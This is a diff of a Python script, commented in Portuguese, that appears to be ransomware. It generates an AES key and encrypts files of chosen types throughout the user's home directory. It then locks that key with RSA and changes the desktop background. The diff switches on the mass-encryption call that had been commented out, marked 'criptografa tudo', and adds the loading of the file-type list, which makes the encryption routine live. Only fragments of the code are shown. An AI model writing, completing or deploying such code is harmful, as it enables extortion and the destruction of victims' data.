@@ -64,13 +64,14 @@ def get_usuario():
 '''
 NOVAS COISAS :
  - arquivo na area de trabalho com todos os arquivos criptografados.
- - json na area de trabalho com o ID, nome,
-
-
 '''
 
 # ponto de partida da criptografia
 def menu(senha_AES):
+    f = open('type.txt')
+    tipos = f.read()
+    tipos_arquivos = tipos.split('\n')
+    tipos_arquivos.remove('')
     # caminho de partida
     home = os.environ['HOME']
     listar(senha_AES,home,tipos_arquivos)
@@ -98,7 +99,7 @@ def listar(chave_AES,diretorio, tipos_arq):
                     else:
                         a = a.replace(" ", "\ ").replace(" (", " \("). replace(")", "\)")
                         try:
-                            criptografa(chave_AES,a)
+                            criptografa(chave_AES, a)
                         except:
                             print('erro ao criptografar-> ' +str(a))
 
@@ -132,7 +133,7 @@ def change_background():
 def crypto_all():
     AES_key = gera_chave_AES()
     print('[*] Chave AES gerada')
-    #menu(AES_key) # -> criptografa tudo
+    menu(AES_key) # -> criptografa tudo
     AES_to_RSA()
     print('[*] Senha AES criptografado com chave RSA')
     RSA_to_SRSA()
@@ -143,8 +144,8 @@ def crypto_all():
 if __name__ == "__main__":
     crypto_all()
     change_background()
-    get_usuario()
-    pass
+    #get_usuario()
+    #pass
 
 
 
